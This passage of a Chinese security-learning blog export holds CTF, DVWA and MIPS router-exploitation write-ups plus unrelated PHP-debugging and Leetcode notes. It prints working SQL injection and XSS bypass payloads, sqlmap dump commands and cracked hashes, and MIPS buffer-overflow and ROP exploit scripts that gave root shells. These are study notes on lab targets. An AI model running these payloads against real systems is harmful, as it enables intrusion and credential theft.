    <content type="text"><![CDATA[Linux目录源自Googlectf2017的一道题 可以通过f参数直接读取到想读的文件flag藏在 /proc/environ中，怎么才能进入到这个目录？ Linux中有一个叫做symlink method也就是相当于一个快捷方式，但是却不同于Windows中的shortcut而正好：/dev/fd这个指向了/proc/self/fd这样payload就不难理解了：/dev/fd/../environ访问/dev/fd就相当于访问了/proc/self之后回退一次就可以找到environ这个文件了 Linux中 /dev/fd/0运行效果是这样的，相当于你输入啥它就会回答啥12345 ✘ pxy@LAPTOP-UBIEP4K5 ~ sudo cat /dev/fd/0aapxypxy 接下来了解一下ln命令 软链接：英文symbolic link非常类似于Windows中的快捷方式 硬链接：英文hard link这类文件会拥有自己的inode节点和名称，其inode会指向文件内容所在的数据块emmm后面不是很懂了 建立软链接的方式：ln -s 源文件名称 软链接文件名称目录和文件均可 现在当前吗目录下创建一个指向/proc/sys的链接 然后我们就可以通过目录遍历来进入到其他的目录了。 软链接还会存在这个问题： 链接的重复定义 这样就不会出问题了，加个-n选项 参考]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscode调试php]]></title>
    <url>%2F2019%2F07%2F21%2Fvscode%E8%B0%83%E8%AF%95php%2F</url>
    <content type="text"><![CDATA[使用vscode调试php代码下载xdebug官网但是需要自己确定php的版本和编译器的版本 但是官网的链接似乎有问题，php5.5的两个反过来了 之后将其添加到php.ini文件中 1234[XDebug]zend_extension = php_xdebug-2.5.5-5.5-vc11.dllxdebug.remote_enable = 1xdebug.remote_autostart = 1 将php添加到环境变量中这就不细说了 配置vscode中的php路径在settings.json中指定 调试 踩到的坑 VScode的php debug插件默认是用环境变量中的php来进行调试的，所以php如果没有加入到环境变量中的话是会报错的。 我刚开始用了wampserver的php来进行调试，但是后来失败了，说是没办法加载xdebug插件，所以换成了phpstudy 找不到setting文件？这个坑害惨了在这个地方需要添加php的路径 两种调试方式，一种是listen for xdebug，需要打开浏览器，另一种是launch currently open script]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>vscode</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT D-link]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-D-link%2F</url>
    <content type="text"><![CDATA[DIR-815栈溢出漏洞屡次调试都失败了，我才发现原来这个版本的DIR-815已经修复了(DIR-815_REVB_FIRMWARE_2.03.B08)。所以这个栈溢出是不存在的 123456789.text:0040BE04 move $a3, $s2.text:0040BE08 la $a2, aSSPostxml # &quot;%s/%s/postxml&quot;.text:0040BE0C move $a0, $s1 # s.text:0040BE10 li $a1, 0x400 # maxlen.text:0040BE14 jalr $t9 ; snprintf.text:0040BE18 sw $v0, 0x4F0+var_4E0($sp).text:0040BE1C lw $gp, 0x4F0+var_4D8($sp).text:0040BE20 move $a2, $s1.text:0040BE24 la $t9, xmldbc_del DIR-645 缓冲区溢出漏洞动态调试：在authenticationcgi_main处下断点 此时返回地址保存在这里： 之后运行到此处： 此时返回地址被覆盖了 继续运行，程序果然崩溃了 进入到函数sub40A424程序在此时崩溃了 尝试修改password长度程序还是崩溃了查看反汇编代码程序从外部读入CONTENT_LENGTH没有进行任何检查12345678910111213141516171819202122232425text:0040B4A0 la $t9, getenv.text:0040B4A4 la $a0, aContent_length # &quot;CONTENT_LENGTH&quot;.text:0040B4A8 jalr $t9 ; getenv.text:0040B4AC move $s0, $v0.text:0040B4B0 lw $gp, 0xF90+var_F78($sp).text:0040B4B4 beqz $s0, loc_40B610.text:0040B4B8 addiu $a0, $sp, 0xF90+var_938.text:0040B4BC beqz $v0, loc_40B614.text:0040B4C0 addiu $a1, $sp, 0xF90+var_E1C.text:0040B4C4 la $t9, atoi.text:0040B4C8 nop.text:0040B4CC jalr $t9 ; atoi.text:0040B4D0 move $a0, $v0 # nptr.text:0040B4D4 lw $gp, 0xF90+var_F78($sp).text:0040B4D8 move $s0, $v0.text:0040B4DC la $v1, stdin.text:0040B4E0 la $t9, fileno.text:0040B4E4 lw $a0, (stdin - 0x4353CC)($v1) # stream.text:0040B4E8 jalr $t9 ; fileno.text:0040B4EC addiu $s1, $sp, 0xF90+var_430.text:0040B4F0 lw $gp, 0xF90+var_F78($sp).text:0040B4F4 move $a0, $v0 # fd.text:0040B4F8 la $t9, read.text:0040B4FC move $a1, $s1 # buf.text:0040B500 jalr $t9 ; read 计算偏移量； 后面的利用过程感觉比较复杂，没能成功地复现 DIR-645命令执行漏洞在安全客上看到了一篇分析DIR-645命令执行地文章，随分析一下原理 直接查看servicecgi_main函数 首先会对请求方法进行判断，如果是POST方法则会调用cgibin_parse_request解析参数，具体的实现暂时不考虑，主要是解析CONTENT_TYPE和CONTENT_LENGTH,之后会调用sess_ispoweruser判断是否为合法用户之后获取 POST 表单字段，若字段名为 EVENT 的话，就将 “event %s &gt; /dev/null” 作为参数执行 lxmldbc_system 函数。查看lxmldbc_system函数123456789sw $a1, 0x428+arg_4($sp)sw $a2, 0x428+arg_8($sp)sw $a3, 0x428+arg_C($sp)move $a2, $a0 # formatmove $a3, $v0 # argmove $a0, $s0 # ssw $v0, 0x428+var_410($sp)jalr $t9 ; vsnprintf li $a1, 0x400 # maxlen 主要关注最后两条指令，因为这里用到了MIPS中地分支延迟槽技术，所以$a1传递参数的指令存放在jalr指令之后故vsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4)vsnprintf函数的用法： 函数原型：int vsnprintf(char str, size_t size, const char format,va_list ap);函数说明：将可变参数格式化输出到一个字符数组参数：str输出到的数组，size指定大小，防止越界，format格式化参数，ap可变参数列表函数用法 接着调用system函数12jalr $t9 ; systemmove $a0, $s0 # command 看一下参数的传递过程 $s0本来是栈上的一个变量，vsnprintf将可变参数格式化输出到其中，之后又将其作为参数传递给system函数 相当于执行了system(&quot;event %s &gt; /dev/null&quot;) 这样就可以想办法进行命令注入了 参考路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习]]></title>
    <url>%2F2019%2F07%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DVWA用的vulstudy的环境默认用户名是admin密码是password需要启动的时候docker-compose up -d就行了停止的话docker-compose stop停止容器 sql注入 最简单的没办法是我太菜了，权当复习好了 :cry: 输入1得到：123ID: 1First name: adminSurname: admin 然后开始爆字段 1’ order by 2 # 确认回显位置： 1’ union select 1,2 # 123ID: 1&apos; union select 1,2 #First name: 1Surname: 2 开始爆数据库 1’ union select database(),2 #得到数据库名123ID: 1&apos; union select database(),2 #First name: dvwaSurname: 2 开始爆表表都存在information_schema.tables这里面 1’ union select table_name,2 from information_schema.tables where table_schema= ‘dvwa’# 得到：123456ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: guestbookSurname: 2ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: usersSurname: 2 开始爆字段然而我并不知道怎么爆字段:disappointed:于是猜测是password 1’ union select password,2 from users 得到了：123456789101112ID: 1&apos; union select password, 2 from users #First name: 5f4dcc3b5aa765d61d8327deb882cf99Surname: 2ID: 1&apos; union select password, 2 from users #First name: e99a18c428cb38d5f260853678922e03Surname: 2ID: 1&apos; union select password, 2 from users #First name: 8d3533d75ae2c3966d7e0d4fcc69216bSurname: 2ID: 1&apos; union select password, 2 from users #First name: 0d107d09f5bbe40cade3de5c71e9e9b7Surname: 2 小白之旅到此结束 升级到medium改成了post方式提交数据这时候sqlmap派上用场了 先将抓到的数据包保存为dvwa.txt文件然后 python sqlmap.py -r “dvwa.txt” —dbs sqlmap很聪明的判断出这是MYSQL数据库并且列出了所有的数据库 123456[22:21:04] [INFO] fetching database namesavailable databases [4]:[*] dvwa[*] information_schema[*] mysql[*] performance_schema 不过这个payload很神奇12345678910111213141516Parameter: id (POST) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1 AND SLEEP(5)&amp;Submit=Submit Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit 指定数据库爆表 python sqlmap.py -r “dvwa.txt” -D dvwa —tables 得到：123456Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+ 指定表爆字段 python sqlmap.py -r “dvwa.txt” -D dvwa -T users —columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ 指定表然后dump数据 python sqlmap.py -r “dvwa.txt” -D dvwa -T users —dump-all sqlmap很机智的在破解md5123[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos; 得到的表12345678910| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://192.168.41.161/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2019-07-15 13:57:22 | 0 || 2 | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2019-07-15 13:57:22 | 0 || 3 | http://192.168.41.161/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2019-07-15 13:57:22 | 0 || 4 | http://192.168.41.161/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2019-07-15 13:57:22 | 0 || 5 | http://192.168.41.161/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2019-07-15 13:57:22 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ sqlmap tql tql tql high这时候就很。。 会弹出一个页面，输入数据之后再跳回来这就很安全了:stuck_out_tongue:但是。。查看源码之后发现：其实没有任何过滤；123// Check database$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); 所以payload照样用，没问题 impossible这次就更不一般了123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里用到了PDO预编译的方式那可能就真的没办法了 看了下stackoverflowHow can I prevent SQL injection in PHP? Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. 可以有两种方式：1234567$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));foreach ($stmt as $row) &#123; // Do something with $row&#125; 或者对于mysql来说，可以：123456789$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;$stmt-&gt;execute();$result = $stmt-&gt;get_result();while ($row = $result-&gt;fetch_assoc()) &#123; // Do something with $row&#125; PDO真的是安全的吗？Are PDO prepared statements sufficient to prevent SQL injection?SQL injection that gets around mysql_real_escape_string() XSS reflected第一遍在chrome上试了下&lt;script&gt;alert(1)&lt;/script&gt;没成功但是看源码： 可能是chrome太安全了吧换成firefox就没事了 medium如果看源码就会发现只是简单地对script进行了一次过滤 $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );那么如何绕过这个限制呢 那就这样构造&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;就能绕过过滤了，主要问题还是过滤不严格，之过滤了一次，所以双写就能很容易地绕过了 ps. 大小写也可以 high这次过滤更严格了$name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); 最后只留了一个&gt;给你 果然我记得还有img标签也可以造成xss来着&lt;img src=&quot;aa&quot; onError=alert(123) &gt;这样就行啦，当然chrome太安全了，还是用firefox吧 impossible1234567checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );// Feedback for end user$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; 这种情况下还进行了实体编码，看你怎么绕过 那些年我们没能bypass的xss filter 一篇总结了xss的文章 sql 盲注从low开始看起，直接抓包然后将数据包保存起来，用sqlmap跑一下就就出来了，-r参数是读取一个数据包中的文件，然后sqlmap会自动解析它 mediume一样的，只是数据包变成了post方式提交的 high这次sqlmap抽风没跑出来看下源码好了本来盲注就是要通过脚本来跑的，但是我比较懒emmm，还是要复习一下如何用python脚本跑出来 如何盲注？ 一篇文章带你深入理解 SQL 盲注 盲注最常见的一个payload127.0.0.1/sqllib/Less-5/?id=1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80–+ 判断数据库中第一个表的第一个字符为否为’P’ xss 存储型还是最简单的low表单上的name有长度限制，不过这只是前端的限制而已&lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt;注入成功 medium这就很尴尬了。。原来这就是存储型xss的厉害了，直接存进去了，所以我打开medium的页面时，连着弹出了两个框框，于是想看一下它的源码： 这里也是通过大小写或者双写就能绕过的 &lt;sCriPt&gt;alert(1)&lt;/script&gt; 找到了一个xss平台 xss平台 但是我发现我不会用了。。]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT 栈溢出笔记]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[MIPS栈溢出x86和MIPS指令集在我的理解看来，x86对于栈的操作多了push和pop操作，而MIPS指令集并没有这些，同时两者一个是小端序，一个是大端序，但是不知道为什么，在调试程序的时候依旧用的是小端序emmmm MISP指令集存在栈溢出的原因叶子函数和非叶子函数 叶子函数的返回地址是直接放在 ra 寄存器中，而非叶子函数需要调用另外的函数，这里的差异就照成了非叶子函数需要把当前的返回地址暂时存放在栈上 实验环境attifyOS虚拟机，基本内置了我需要的所有工具，当然其中的IDA似乎过期了，去吾爱破解上找了一个Linux版本的IDA安装了 吾爱破解链接 MIPS动态调试使用qemu-mipsel或者qemu-mipsel-static进行调试，qemu支持使用gdb进行调试，-g选项开启一个端口，IDA可以连接上这个端口从而进行动态调试。之前在看雪的虚拟机上只能用qemu-mipsel-static调试，后来换成了attifyOS发现两者都行。不过如果缺少动态链接库的话还是需要chroot同时将相应的库拷贝过来。 简单的栈溢出源码：123456789101112131415#include &lt;stdio.h&gt;void vuln()&#123; system(&quot;/bin/sh&quot;);&#125;void has_stack(char *src)&#123; char dst[20] = &#123;0&#125;; strcpy(dst,src); printf(&quot;copy success!n&quot;);&#125;void main(int argc,char *argv[])&#123; has_stack(argv[1]);&#125; 使用mipsel-linux-gcc进行编译 mipsel-linux-gcc ./stack01.c -o stack01 -static 编译之后得到：root@ubuntu:~/stack# file stack01 stack01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped 使用IDA查看反汇编： 由于main函数中调用了其他的函数，所以main函数必然是非叶子函数，当然这里我们不是覆盖main函数的返回地址，因为has_stack函数也是非叶子函数，而且strcpy没有对长度做限制。 strcpy的第一个参数dst存放在$a0中，第二个参数src存放在$a1中，123456789.text:00400410 sw $zero, 0x38+var_10($fp).text:00400414 addiu $v0, $fp, 0x38+var_20 #要拷贝到的地方.text:00400418 move $a0, $v0.text:0040041C lw $a1, 0x38+arg_0($fp) # 要拷贝的内容.text:00400420 la $v0, strcpy.text:00400424 move $t9, $v0.text:00400428 jalr $t9 ; strcpy.text:0040042C nop.text:00400430 lw $gp, 0x38+var_28($fp) 偷懒一点不仔细分析栈了 使用patternLocOffset.py工具生成长度为30的字符串12345/home/oit [oit@ubuntu] [4:31]&gt; python patternOffset.py -c -l 30[*] Create pattern string contains 30 characters ok![+] output to patternShell.txt ok![+] take time: 0.0004 s 动态调试：./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9 直接在调用函数返回的地方下断点，查看此时的$ra寄存器的值12345.text:00400450 move $sp, $fp.text:00400454 lw $ra, 0x38+var_4($sp).text:00400458 lw $fp, 0x38+var_8($sp).text:0040045C addiu $sp, 0x38.text:00400460 jr $ra (断点) 计算需要padding的长度12345&gt; python patternOffset.py -s 0x62413961 -l 30[*] Create pattern string contains 30 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 28 (adjusted another-endian)[+] take time: 0.0008 s 需要填充28个字节 最后的payload ./qemu-mipsel-static -g 1234 ./stack01 `python -c “print ‘a’*28+’\x90\x03\x40\x00’”` 此时成功地发生了跳转 12345root@ubuntu:~/stack# ./qemu-mipsel-static ./stack01 `python -c &quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# lscore qemu-mipsel-static stack01 stack01.id0 stack01.idb stack01.tilqemu-mipsel ret2txt.c stack01.c stack01.id1 stack01.nam# whoamiroot ROP chain1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat(&quot;passwd&quot;,&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL) &#123; printf(&quot;Cannot open file passwd!n&quot;); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = &apos;x00&apos;; if(!strcmp(buf,&quot;adminpwd&quot;)) &#123; do_system_0(count,&quot;ls -l&quot;); &#125; else &#123; printf(&quot;you have an invalid password!n&quot;); &#125; fclose(fp);&#125; 此处main函数明显是非叶子函数，我们要想办法调用do_system_0这个函数那就要想办法控制$a1寄存器，那样就可以执行任何命令 mipsrop.stackfinder()查找gadget 我们选择0x00403660 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) 要做到跳转到我们的gadget，需要覆盖main函数的返回地址 先计算要padding的长度 此时计算出来的pattern是412，会不会太长了点(注：在我参考的文章中作者计算出来的偏移和我的不一样，刚开始我以为是自己计算错了，但是后来调试后认为自己并没有算错) 接下来我尝试先覆盖main函数的返回地址跳转到rop的空间，再将/bin/sh字符串的地址赋值给$a1 $ra被覆盖 f7单步一次，跳转到gadget而且此时栈空间已经布置好了addiu $a1, $sp, 0x58+var_40相当于 $a1 = $sp+0x18 此时$sp+0x18存放的就是/bin/sh字符串的地址 然而不知道为什么这个错误就很不明不白了 重新回顾了一下《揭秘家用路由器0day漏洞挖掘技术》，看到了作者写的一个exp将gadget的地址替换成我的，如下：12345678910111213141516171819202122import structcmd = &quot;sh&quot;cmd += &quot;\x00&quot;*(4-len(cmd)%4)shellcode = &quot;A&quot;*0x19cshellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadget地址，作者写的是&quot;&lt;L&quot;但是我尝试之后发现地址是反的，所以换过来了shellcode+=&quot;A&quot;*24shellcode+=cmdshellcode+=&quot;B&quot;*(0x3C-len(cmd))shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0函数地址shellcode+=&quot;BBBB&quot;print &quot;ok&quot;print &quot;[+] create password file&quot;fw = open(&apos;passwd&apos;, &apos;w&apos;)fw.write(shellcode)fw.close()print &apos;ok&apos; 生成passwd文件之后，./qemu-mipsel-static -g 1234 ./vuln_system进行调试当程序跳转到gadget时，变成了这样， 此时看终端：我居然成功了？？此时已经拿到了root权限 确实没有看错，重新运行一遍程序，确实拿到了shell权限 DVRF 练习这个在attifyOS上已经下载好了，当然也可以去GitHub上clone一份，一个很不错的项目 来看Intro的stack_bof_01程序位于/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/ 源码位于/home/oit/DVRF/Pwnable Source/Intro1234567891011121314151617181920212223242526272829303132#include &lt;string.h&gt;#include &lt;stdio.h&gt;//Simple BoF by b1ack0wl for E1550int main(int argc, char **argv[])&#123;char buf[200] =&quot;\0&quot;;if (argc &lt; 2)&#123;printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);exit(1);&#125;printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);strcpy(buf, argv[1]);printf(&quot;You entered %s \r\n&quot;, buf);printf(&quot;Try Again\r\n&quot;);return 0x41; // Just so you can see what register is populated for return statements&#125;void dat_shell()&#123;printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);system(&quot;/bin/sh -c&quot;);//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);//execve(&quot;/bin/sh&quot;, 0, 0);exit(0);&#125; 显然也是strcpy函数没有限制拷贝的长度 运行它：123root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01Usage: stack_bof_01 &lt;argument&gt;-By b1ack0wl 我们直接计算偏移地址 生成长度为200的字符串 123456/home/oit [oit@ubuntu] [5:50]&gt; python patternOffset.py -s 0x41386741 -l 200[*] Create pattern string contains 200 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 204 (adjusted another-endian)[+] take time: 0.0042 s 那我们试一试直接填充 12root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; testroot@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot; 此时已经将$ra寄存器的值覆盖掉了但是 在dat_shell函数中报错了所以这时候需要借助gadget 之前参考了几篇文章，都是通过查找libc的基地址来确认gadget在内存中的地址的，但是我开始要gdb调试的时候并没有看到libc.so.0的加载，所以我一直怀疑是不是没加载，然后然后，看到原程序中是有puts和memset这些函数的，那显然是加载了的于是下一个断点然后调试 终于找到了libc的加载基址 这样就好办了python -c &quot;print &#39;a&#39;*204+&#39;\x20\x1b\x8a\x40&#39;+&#39;\x50\x09\x40\x00&#39;&quot; &gt; test 之后运行 ok已经成功了！！！1234567root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;Welcome to the first BoF exercise!You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa �@P @Try AgainCongrats! I will now execute /bin/sh- b1ack0wl 不过为啥用mipsrop找不到这个gadget呢？很疑惑 确认libc基址的方法大概有： vmmap cat /proc/pid/maps查看进程的内存分布 在IDA中查找到函数真正加载的位置，然后计算偏移 参考路由器漏洞挖掘之栈溢出入门（一）(感觉这篇文章中第二个程序调试的不是很正确，因为偏移计算的都不一样)路由器漏洞挖掘之栈溢出入门（二）]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[两道sql注入题]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[基于sql的盲注之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式 可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &quot;post.txt&quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &quot;url&quot; --forms 指定参数 趁机学到了一把sqlmap使用虽然这个题目是有点。。但是注入点的判断也是很重要的 爆后端数据库python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; 爆数据库python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs 指定数据库报表爆表python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables 指定数据库和表爆字段python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns 指定数据库，表，字符然后dump出数据python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump123456789Database: stormgroupTable: member[2 entries]+-------+----------------------------------+--------+| name | password | status |+-------+----------------------------------+--------+| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0 || mozhe | b7a0bebf8287c87253fb2958a390346a | 1 |+-------+----------------------------------+--------+ 解密之后是106370这样就能登陆后台了太神奇了 参考sqlmap之(六)——POST登陆框注入实战 SQL手工注入漏洞测试(Access数据库)这道题目就有点神奇了 纯靠猜 order by 4判断有多少个字段 然后 new_list.asp?id=1 and exists(select * from admin)判断是否存在admin 接下来判断回显位置/new_list.asp?id=1 union select 1,2,3,4 from admin 接下来猜测字段值and exists (select id from admin) 爆出字段值union select 1,username,passwd,id from admin md5解密一下登陆就行了 参考]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 2]]></title>
    <url>%2F2019%2F07%2F15%2FLeetcode-2%2F</url>
    <content type="text"><![CDATA[错解怎么快速地将链表倒置 :confused: 最后还是因为溢出的问题 思路： 12345678910111213141516171819202122​ int k = 0; ListNode temp1 = l1; ListNode temp2 = l2; double resultl1 = 0; double resultl2 = 0; while (temp1 != null) &#123; int tempvalue = temp1.val; resultl1 = resultl1 + tempvalue * Math.pow(10, k); k++; temp1 = temp1.next; &#125; 就是将其转化为整数，因为链表的第一个元素是最低位，之后是十位，百位等 将得到的结果在转化为链表 1234567891011121314151617181920int result = (int) (resultl1 + resultl2);ListNode ans = new ListNode(0); //先取一个头节点ListNode head = ans;int length = Integer.toString(result).length();for (int i = 0; i &lt; length; i++) &#123; ListNode temp = new ListNode(result % 10); head.next = temp; head = head.next; result = result / 10;&#125; 记录一下将整数转为string的操作 Integer.toString(result) Math.pow函数的返回值必须是double类型的 但是这样会面临一个问题，也就是最开图片的那个，溢出！ 